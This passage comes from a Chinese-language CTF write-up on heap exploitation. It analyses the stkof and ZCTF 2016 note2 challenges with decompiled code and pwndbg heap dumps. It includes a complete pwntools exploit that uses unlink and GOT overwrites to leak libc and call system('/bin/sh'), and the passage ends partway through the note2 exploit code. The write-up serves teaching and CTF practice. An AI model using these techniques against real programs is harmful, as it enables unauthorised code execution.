<li>alloc：输入 size，分配 size 大小的内存，并在 bss 段记录对应 chunk 的指针，假设其为 global</li>
<li>fill：根据指定索引，向分配的内存处读入数据，数据长度可控，<strong>这里存在堆溢出的情况</strong></li>
<li>free_chunk：根据指定索引，释放已经分配的内存块</li>
<li>print：这个功能并没有什么卵用，本来以为是可以输出内容，结果什么也没有输出</li>
</ul>
<h3 id="_7">漏洞函数<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
<p>fiil 写入字符长度是由用户决定的，这里就存在一个堆溢出。</p>
<div class="highlight"><pre><span></span><code><span class="n">idx</span> <span class="o">=</span> <span class="n">atol</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span> <span class="n">idx</span> <span class="o">&gt;</span> <span class="mh">0x100000</span> <span class="p">)</span>
    <span class="k">return</span> <span class="mh">0xFFFFFFFFLL</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">globals</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="p">)</span>
    <span class="k">return</span> <span class="mh">0xFFFFFFFFLL</span><span class="p">;</span>
<span class="n">fgets</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
<span class="n">size</span> <span class="o">=</span> <span class="n">atoll</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>
<span class="n">ptr</span> <span class="o">=</span> <span class="n">globals</span><span class="p">[</span><span class="n">idx</span><span class="p">];</span>
</code></pre></div>
<h3 id="io">IO 缓冲区问题分析<a class="headerlink" href="#io" title="Permanent link">&para;</a></h3>
<p>这条题目堆空间一开始可能和我们想象的不一样，这是由于程序本身没有进行 setbuf 操作，所以在执行输入输出操作的时候会申请缓冲区。这里经过测试，会申请两个缓冲区，分别大小为 1024 和 1024。具体如下，可以进行调试查看。</p>
<p>初次调用 fgets 时，malloc 会分配缓冲区 1024 大小。</p>
<div class="highlight"><pre><span></span><code>*RAX  0x0
*RBX  0x400
*RCX  0x7ffff7b03c34 (__fxstat64+20) ◂— cmp    rax, -0x1000 /* &#39;H=&#39; */
*RDX  0x88
*RDI  0x400
*RSI  0x7fffffffd860 ◂— 0x16
*R8   0x1
*R9   0x0
*R10  0x7ffff7fd2700 ◂— 0x7ffff7fd2700
*R11  0x246
*R12  0xa
*R13  0x9
 R14  0x0
*R15  0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad2288
*RBP  0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad2288
*RSP  0x7fffffffd858 —▸ 0x7ffff7a7a1d5 (_IO_file_doallocate+85) ◂— mov    rsi, rax
*RIP  0x7ffff7a91130 (malloc) ◂— push   rbp
─────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────
 ► 0x7ffff7a91130 &lt;malloc&gt;        push   rbp &lt;0x7ffff7dd18e0&gt;
...，省略
 ► f 0     7ffff7a91130 malloc
   f 1     7ffff7a7a1d5 _IO_file_doallocate+85
   f 2     7ffff7a88594 _IO_doallocbuf+52
   f 3     7ffff7a8769c _IO_file_underflow+508
   f 4     7ffff7a8860e _IO_default_uflow+14
   f 5     7ffff7a7bc6a _IO_getline_info+170
   f 6     7ffff7a7bd78
   f 7     7ffff7a7ab7d fgets+173
   f 8           400d2e
   f 9     7ffff7a2d830 __libc_start_main+240
</code></pre></div>
<p>分配之后，堆如下</p>
<div class="highlight"><pre><span></span><code>pwndbg&gt; heap
Top Chunk: 0xe05410
Last Remainder: 0

0xe05000 PREV_INUSE {
  prev_size = 0,
  size = 1041,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0xe05410 PREV_INUSE {
  prev_size = 0,
  size = 134129,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
</code></pre></div>
<p>当分配16大小的内存后，堆布局如下</p>
<div class="highlight"><pre><span></span><code>pwndbg&gt; heap
Top Chunk: 0xe05430
Last Remainder: 0

0xe05000 PREV_INUSE {
  prev_size = 0,
  size = 1041,
  fd = 0xa3631,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0xe05410 FASTBIN {
  prev_size = 0,
  size = 33,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x20bd1
}
0xe05430 PREV_INUSE {
  prev_size = 0,
  size = 134097,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
</code></pre></div>
<p>当使用 printf 函数，会分配 1024 字节空间，如下</p>
<div class="highlight"><pre><span></span><code>*RAX  0x0
*RBX  0x400
*RCX  0x7ffff7b03c34 (__fxstat64+20) ◂— cmp    rax, -0x1000 /* &#39;H=&#39; */
*RDX  0x88
*RDI  0x400
*RSI  0x7fffffffd1c0 ◂— 0x16
 R8   0x0
*R9   0x0
*R10  0x0
*R11  0x246
*R12  0x1
*R13  0x7fffffffd827 ◂— 0x31 /* &#39;1&#39; */
 R14  0x0
*R15  0x400de4 ◂— and    eax, 0x2e000a64 /* &#39;%d\n&#39; */
*RBP  0x7ffff7dd2620 (_IO_2_1_stdout_) ◂— 0xfbad2284
*RSP  0x7fffffffd1b8 —▸ 0x7ffff7a7a1d5 (_IO_file_doallocate+85) ◂— mov    rsi, rax
*RIP  0x7ffff7a91130 (malloc) ◂— push   rbp
─────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────
 ► 0x7ffff7a91130 &lt;malloc&gt;       push   rbp &lt;0x7ffff7dd2620&gt;
。。。省略
► f 0     7ffff7a91130 malloc
   f 1     7ffff7a7a1d5 _IO_file_doallocate+85
   f 2     7ffff7a88594 _IO_doallocbuf+52
   f 3     7ffff7a878f8 _IO_file_overflow+456
   f 4     7ffff7a8628d _IO_file_xsputn+173
   f 5     7ffff7a5ae00 vfprintf+3216
   f 6     7ffff7a62899 printf+153
   f 7           4009cd
   f 8           400cb1
   f 9     7ffff7a2d830 __libc_start_main+240
</code></pre></div>
<p>堆布局如下</p>
<div class="highlight"><pre><span></span><code>pwndbg&gt; heap
Top Chunk: 0xe05840
Last Remainder: 0

0xe05000 PREV_INUSE {
  prev_size = 0,
  size = 1041,
  fd = 0xa3631,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0xe05410 FASTBIN {
  prev_size = 0,
  size = 33,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x411
}
0xe05430 PREV_INUSE {
  prev_size = 0,
  size = 1041,
  fd = 0xa4b4f,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0xe05840 PREV_INUSE {
  prev_size = 0,
  size = 133057,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
</code></pre></div>
<p>此后，无论是输入输出都不会再申请缓冲区了。所以我们最好最初的申请一个 chunk 来把这些缓冲区给申请了，方便之后操作。</p>
<p>但是，比较有意思的是，如果我们是 gdb.attach 上去的话，第一个缓冲区分配的大小为 4096 大小。</p>
<div class="highlight"><pre><span></span><code>pwndbg&gt; heap
Top Chunk: 0x1e9b010
Last Remainder: 0

0x1e9a000 PREV_INUSE {
  prev_size = 0,
  size = 4113,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0x1e9b010 PREV_INUSE {
  prev_size = 0,
  size = 135153,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
</code></pre></div>
<p>申请第一个堆（0x48），之后还会出现第二个缓冲区堆块（1040）：</p>
<div class="highlight"><pre><span></span><code>//重新启动过，所以地址与上面不对应，但是结构是一样的
pwndbg&gt; heap
0xe05000 PREV_INUSE {
  prev_size = 0, 
  size = 4113, 
  fd = 0xa383231, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0xe06010 FASTBIN {
  prev_size = 0, 
  size = 81, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0xe06060 PREV_INUSE {
  prev_size = 0, 
  size = 1041, 
  fd = 0xa4b4f, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
…………
</code></pre></div>
<h3 id="_8">基本思路<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h3>
<p>根据上面分析，我们在前面先分配一个 chunk 来把缓冲区分配完毕，以免影响之后的操作。</p>
<p>由于程序本身没有 leak，要想执行 system 等函数，我们的首要目的还是先构造 leak，基本思路如下：</p>
<ul>
<li>利用 unlink 修改 global[2] 为 &amp;global[2]-0x18。</li>
<li>利用编辑功能修改 global[0] 为 free@got 地址，同时修改 global[1] 为puts@got 地址，global[2] 为 &amp;global[2]-0x18 。</li>
<li>修改 <code>free@got</code> 为 <code>puts@plt</code> 的地址，从而当再次调用 <code>free</code> 函数时，即可直接调用 puts 函数。这样就可以泄漏函数内容。</li>
<li>free global[1]，即泄漏 puts@got 内容，从而知道 system 函数地址以及 libc 中 /bin/sh 地址。</li>
<li>修改 global[1] 为 /bin/sh 地址，修改 <code>free@got</code> 为 <code>system@got</code> 的地址，free chunk 1 即可。</li>
</ul>
<p>unlink 我们搞两个物理相邻的堆即可（2&amp;3），也不需要关心 chunk3  free 时会与 topchunk 合并，所以没有创建一个保护堆块。</p>
<div class="highlight"><pre><span></span><code><span class="n">create</span><span class="p">(</span><span class="mh">0x48</span><span class="p">)</span>    <span class="c1"># 1</span>
<span class="n">create</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span>    <span class="c1"># 2</span>
<span class="n">create</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span>    <span class="c1"># 3</span>
</code></pre></div>
<blockquote>
<p>最后 getshell 做法和 wiki 略有区别。</p>
</blockquote>
<h3 id="exp">EXP<a class="headerlink" href="#exp" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>
<span class="c1"># @Author  : MrSkYe</span>
<span class="c1"># @Email   : skye231@foxmail.com</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./stkof&quot;</span><span class="p">)</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./stkof&quot;</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;OK</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;OK</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="nb">globals</span> <span class="o">=</span> <span class="mh">0x0602140</span>
<span class="n">ptr</span> <span class="o">=</span> <span class="nb">globals</span> <span class="o">+</span> <span class="mh">0x10</span>

<span class="n">create</span><span class="p">(</span><span class="mh">0x48</span><span class="p">)</span>    <span class="c1"># 1</span>
<span class="n">create</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span>    <span class="c1"># 2</span>
<span class="n">create</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span>    <span class="c1"># 3</span>

<span class="c1"># 伪造一个堆块；修改chunk3 size；</span>
<span class="n">payload0</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span>
<span class="n">payload0</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ptr</span><span class="o">-</span><span class="mh">0x18</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ptr</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span>
<span class="n">payload0</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span>
<span class="n">payload0</span> <span class="o">=</span> <span class="n">payload0</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x30</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
<span class="n">payload0</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x90</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">payload0</span><span class="p">),</span><span class="n">payload0</span><span class="p">)</span>
<span class="c1"># 触发unlink</span>
<span class="n">free</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;OK</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>

<span class="c1"># 修改global指针表</span>
<span class="n">payload1</span> <span class="o">=</span> <span class="s2">&quot;skye&quot;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x8</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;free&#39;</span><span class="p">])</span>    <span class="c1"># 0</span>
<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">])</span>    <span class="c1"># 1</span>
<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">globals</span><span class="o">-</span><span class="mh">0x8</span><span class="p">)</span>        <span class="c1"># 2</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">payload1</span><span class="p">),</span><span class="n">payload1</span><span class="p">)</span>

<span class="c1"># overwrite free 2 puts</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]))</span>
<span class="c1"># leak libc</span>
<span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">puts_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">OK</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;puts_addr:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">))</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
<span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">))</span>
<span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;libc_base:&#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;binsh_addr:&#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;system_addr:&#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>

<span class="c1"># 修改global指针表</span>
<span class="n">payload2</span> <span class="o">=</span> <span class="s2">&quot;skye&quot;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x8</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;free&#39;</span><span class="p">])</span>    <span class="c1"># 0</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span>         <span class="c1"># 1</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">payload2</span><span class="p">),</span><span class="n">payload2</span><span class="p">)</span>
<span class="c1"># overwrite free 2 system</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
<span class="c1"># gdb.attach(p,&#39;b *0x0400919&#39;)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>


<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>
<h2 id="2016-zctf-note2">2016 ZCTF note2<a class="headerlink" href="#2016-zctf-note2" title="Permanent link">&para;</a></h2>
<h3 id="_9">基本信息<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code>    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    note2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked
</code></pre></div>
<h3 id="_10">分析程序<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h3>
<p>首先，我们先分析一下程序，可以看出程序的主要功能为</p>
<ul>
<li>添加 note，size 限制为 0x80，size 会被记录，note 指针会被记录。</li>
<li>展示 note 内容。</li>
<li>编辑 note 内容，其中包括覆盖已有的 note，在已有的 note 后面添加内容。</li>
<li>释放 note。</li>
</ul>
<p>仔细分析后，可以发现程序有以下几个问题</p>
<ol>
<li>
<p>在 create 时，程序会记录 note 对应的大小，该大小会用于控制读取 note 的内容。自定义函数中的循环变量 i 定义为 int 型，但是用于比较的传入参数定义是 unsigned int 。</p>
<div class="highlight"><pre><span></span><code><span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mf">0L</span><span class="n">L</span><span class="p">;</span> <span class="n">length</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">&gt;</span> <span class="n">i</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>          <span class="c1">// 预留最后一位写入\x00</span>
    <span class="c1">// 堆溢出：length为unsigned int，当length等于0时，结果是一个非常大整数</span>
<span class="p">{</span>
    <span class="n">v7</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">1uLL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v7</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="p">)</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">-1</span><span class="p">);</span>                                 <span class="c1">// 读入错误退出程序</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">buf</span> <span class="o">==</span> <span class="n">v4</span> <span class="p">)</span>                            <span class="c1">// 判断结束符</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">i</span> <span class="o">+</span> <span class="n">ptr</span><span class="p">)</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
<span class="p">}</span>
<span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">ptr</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>                      <span class="c1">// 写入结束符\x00</span>
<span class="k">return</span> <span class="n">i</span><span class="p">;</span>
</code></pre></div>
<p>在 C 语言中，我们用 int 和 unsigned int 两种数据类型进行运算时，会自动转换为 unsigned int，那么当我们输入 size 为 0 时，glibc 根据其规定，会分配 0x20 个字节，即：prez_size,size,fd,bk。因为 size 为 0 ，然后退出判断条件为：size-1 ，那么退出条件就恒满足，程序读取的长度就不受到限制，故而会产生堆溢出。</p>
</li>
<li>
<p>程序在每次编辑 note 时，都会申请 0xa0 大小的内存，但是在 free 之后并没有设置为 NULL，对做题没有影响。但是注意一下每次编辑时可输入的长度，是否能被利用。（后面有详解）</p>
</li>
</ol>
<h3 id="_11">漏洞函数<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h3>
<p>在编辑 create 时调用，存在写入长度可控，造成堆溢出。</p>
<div class="highlight"><pre><span></span><code><span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mf">0L</span><span class="n">L</span><span class="p">;</span> <span class="n">length</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">&gt;</span> <span class="n">i</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>          <span class="c1">// 预留最后一位写入\x00</span>
    <span class="c1">// 堆溢出：length为unsigned int，当length等于0时，结果是一个非常大整数</span>
<span class="p">{</span>
    <span class="n">v7</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">1uLL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v7</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="p">)</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">-1</span><span class="p">);</span>                                 <span class="c1">// 读入错误退出程序</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">buf</span> <span class="o">==</span> <span class="n">v4</span> <span class="p">)</span>                            <span class="c1">// 判断结束符</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">i</span> <span class="o">+</span> <span class="n">ptr</span><span class="p">)</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
<span class="p">}</span>
<span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">ptr</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>                      <span class="c1">// 写入结束符\x00</span>
<span class="k">return</span> <span class="n">i</span><span class="p">;</span>
</code></pre></div>
<p>造成原因前面有说，这里概述一下：length 为 unsigned int 当与 int 类型运算时，结果会被自动转换为 unsigned int ，那么 length - 1 就能产生一个巨大正数，从而无限输入。</p>
<p>还有一个地方就是 edit 功能。主要逻辑是创建一个 0xa0 的堆块，用来存放 tmp 数据、准备写入被修改 chunk 的数据，重点是**每次输入临时数据长度都是 0x90 **</p>
<div class="highlight"><pre><span></span><code><span class="n">my_input</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)(</span><span class="n">v8</span> <span class="o">+</span> <span class="mi">15</span><span class="p">),</span> <span class="mh">0x90LL</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
</code></pre></div>
<p>一开始看上去是存在溢出，假如 chunk size 为 0x80 ，就能溢出 0x90 ？不想多了，在调试后发现不会溢出的，因为有这一句话：</p>
<div class="highlight"><pre><span></span><code><span class="n">v1</span><span class="p">[</span><span class="n">chunk_size</span> <span class="o">-</span> <span class="n">strlen</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dest</span><span class="p">)</span> <span class="o">+</span> <span class="mi">14</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</code></pre></div>
<p>程序会在 chunk size 上限的地方写入一个 <code>\x00</code> ，从而避免了溢出。所以漏洞利用点就只有一个。</p>
<h3 id="_12">基本思路<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h3>
<p>这里我们利用发现的第一个问题，主要利用了 fastbin 的机制、unlink 的机制。</p>
<ol>
<li>创建 3 个堆块，chunk1 为 fastbin ，其余是 unsorted bin 。创建 chunk 0 写入数据时，将 fake chunk 也写入。</li>
<li>释放 chunk 1 ， 然后再次申请相同大小的 chunk ，由于 fastbin 机制，会使用原来 chunk 1 的地址。申请 size 为 0 ，触发漏洞修改 chunk 2 的 prez_size 和 prez_inuse 。</li>
<li>释放 chunk 2 触发 unlink hijack chunk list 指针列表。</li>
</ol>
<h4 id="_13">基本操作<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h4>
<p>首先，我们先把 note 可能的基本操作列举出来。</p>
<div class="highlight"><pre><span></span><code><span class="c1"># coding=UTF-8</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./note2&#39;</span><span class="p">)</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./note2&#39;</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span><span class="p">)</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>


<span class="k">def</span> <span class="nf">newnote</span><span class="p">(</span><span class="n">length</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;option---&gt;&gt;&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
